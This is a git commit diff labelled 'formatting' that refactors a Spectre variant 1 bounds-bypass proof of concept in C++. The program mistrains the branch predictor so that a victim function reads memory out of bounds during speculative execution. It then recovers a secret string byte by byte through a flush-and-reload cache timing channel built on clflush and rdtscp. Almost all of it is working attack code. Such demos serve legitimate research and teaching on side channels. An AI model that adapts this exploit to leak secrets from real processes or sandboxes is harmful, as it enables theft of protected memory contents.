6c4b337d951d563723c1c5de5758ef96d3231ff7
Andrew Witten <awitten007@gmail.com>
2026-04-30 14:43:41 -0400

    formatting

--- spectre_v1/spectre_v1_bounds_bypass.cpp
+++ spectre_v1/spectre_v1_bounds_bypass.cpp
@@ -17,7 +17,7 @@
 #define ITERS 1000
 #endif
 #ifndef TRAIN_REPS
-#define TRAIN_REPS 30
+#define TRAIN_REPS 100
 #endif
 #ifndef THRESHOLD
 #define THRESHOLD 120
@@ -28,14 +28,11 @@
 #ifndef NUM_PAGES
 #define NUM_PAGES 256
 #endif
-#ifndef TRAINING_ITERS
-#define TRAINING_ITERS 100
-#endif
 
 static volatile size_t array_size = ARRAY_SIZE;
 static unsigned char public_array[ARRAY_SIZE];
 static unsigned char *array = public_array;
-static unsigned char *probe;
+static unsigned char *probe_buf;
 static volatile unsigned char temp = 0;
 static const char secret[] = "this is my super secret value!";
 
@@ -46,7 +43,7 @@ static void victim(size_t x) {
 
     if (x < array_size) {
         unsigned char secret_byte = array[x];
-        volatile unsigned char x = probe[PAGE_SIZE * secret_byte];
+        volatile unsigned char x = probe_buf[PAGE_SIZE * secret_byte];
     }
 }
 
@@ -57,40 +54,52 @@ static inline long time_load(void *ptr) {
     return (long)(__rdtscp(&junk) - start);
 }
 
+#define TIME_LOAD(ptr) time_load((void *)(ptr))
+
 static unsigned int lcg_next(unsigned int state) {
     return state * 1664525u + 1013904223u;
 }
 
-static void flush_probe(void) {
-    for (int i = 0; i < PAGE_SIZE * NUM_PAGES; i += CACHELINE_SIZE) {
-        _mm_clflush(probe + i);
-    }
-    _mm_mfence();
-}
-
-static void shuffle(int *order, int n, unsigned int *state) {
-    for (int i = 0; i < n; ++i) {
+static int probe(void *buf, int num_slots, int threshold, int *order, unsigned int *lcg_state) {
+    for (int i = 0; i < num_slots; ++i) {
         order[i] = i;
     }
-    for (int i = n - 1; i > 0; --i) {
-        *state = lcg_next(*state);
-        int j = (int)(*state % (unsigned int)(i + 1));
+    for (int i = num_slots - 1; i > 0; --i) {
+        *lcg_state = lcg_next(*lcg_state);
+        int j = (int)(*lcg_state % (unsigned int)(i + 1));
         int tmp = order[i];
         order[i] = order[j];
         order[j] = tmp;
     }
-}
 
-static int probe_buffer(int *order, unsigned int *state) {
-    shuffle(order, NUM_PAGES, state);
-    for (int i = 0; i < NUM_PAGES; ++i) {
+    for (int i = 0; i < num_slots; ++i) {
         int page = order[i];
-        if (time_load(probe + PAGE_SIZE * page) < THRESHOLD) {
+        char *ptr = (char *)buf + page * PAGE_SIZE;
+        if (TIME_LOAD(ptr) < threshold) {
             return page;
         }
     }
 
     return -1;
+}
+
+void* alloc_buf(int num_pages) {
+    void* buf = mmap(NULL, PAGE_SIZE*num_pages, PROT_READ | PROT_WRITE
+        , MAP_ANONYMOUS | MAP_SHARED, -1, 0);
+    if (buf == MAP_FAILED) {
+        perror("mmap");
+        exit(1);
+    }
+    memset(buf, 1, PAGE_SIZE*num_pages);
+
+    return buf;
+}
+
+void flush_buffer(void* buf, int buf_sz) {
+    for (int i = 0; i < buf_sz; i += CACHELINE_SIZE) {
+        _mm_clflush((char*)buf + i);
+    }
+    _mm_lfence();
 }
 
 static void pin_cpu(int cpu) {
@@ -103,50 +112,48 @@ static void pin_cpu(int cpu) {
     }
 }
 
-static void setup(void) {
+__attribute__((noinline))
+void initialize_array() {
     for (int i = 0; i < ARRAY_SIZE; ++i) {
         array[i] = (unsigned char)(i + 1);
     }
-
-    probe = (unsigned char *)mmap(NULL, PAGE_SIZE * NUM_PAGES, PROT_READ | PROT_WRITE,
-                                  MAP_ANONYMOUS | MAP_SHARED, -1, 0);
-    if (probe == MAP_FAILED) {
-        perror("mmap");
-        exit(1);
-    }
-    memset(probe, 1, PAGE_SIZE * NUM_PAGES);
 }
 
 static void train_then_attack(size_t malicious_x, unsigned int attempt) {
     size_t training_x = attempt % ARRAY_SIZE;
-    int training_iters = rand() % 1000;
-    for (volatile int j = TRAINING_ITERS; j >= 0; --j) {
-        size_t x = (j == 0) ? malicious_x : training_x;
+
+    for (volatile int j = 0; j <= TRAIN_REPS; ++j) {
+        size_t x = (j == TRAIN_REPS) ? malicious_x : training_x;
         victim(x);
     }
 }
 
 int main() {
+    const int cpu = 0;
+    const int secret_len = (int)strlen(secret);
+    char guessed[sizeof(secret)] = {};
+    uintptr_t diff = (uintptr_t)secret - (uintptr_t)array;
+
+    pin_cpu(cpu);
+    initialize_array();
+
+    probe_buf = (unsigned char *)alloc_buf(NUM_PAGES);
+
     int order[NUM_PAGES];
     unsigned int lcg_state = 1;
-    char guessed[sizeof(secret)] = {};
-    int secret_len = (int)strlen(secret);
-    uintptr_t diff = (uintptr_t)secret - (uintptr_t)array;
+
     printf("array=%p secret=%p malicious_base_x=%zu\n",
            (void *)array, (const void *)secret, (size_t)diff);
-
-    pin_cpu(0);
-    setup();
 
     for (int byte = 0; byte < secret_len; ++byte) {
         int scores[NUM_PAGES] = {};
         size_t malicious_x = (size_t)(diff + (uintptr_t)byte);
 
         for (int i = 0; i < ITERS; ++i) {
-            flush_probe();
+            flush_buffer(probe_buf, PAGE_SIZE * NUM_PAGES);
             train_then_attack(malicious_x, (unsigned int)i);
 
-            int found = probe_buffer(order, &lcg_state);
+            int found = probe(probe_buf, NUM_PAGES, THRESHOLD, order, &lcg_state);
             if (found >= 0) {
                 scores[found]++;
             }
@@ -165,9 +172,8 @@ int main() {
         }
 
         guessed[byte] = best >= 0 ? (char)best : '_';
-        printf("secret[%2d]: expected=0x%02x guessed=0x%02x score=%d/%d %s\n",
-               byte, (unsigned char)secret[byte], best, best_count, ITERS,
-               best == (unsigned char)secret[byte] ? "hit" : "miss");
+        printf("secret[%2d]: best=0x%02x hit_rate=%.2f%%\n",
+               byte, best, 100.0 * (double)best_count / (double)ITERS);
     }
 
     printf("expected: %s\n", secret);
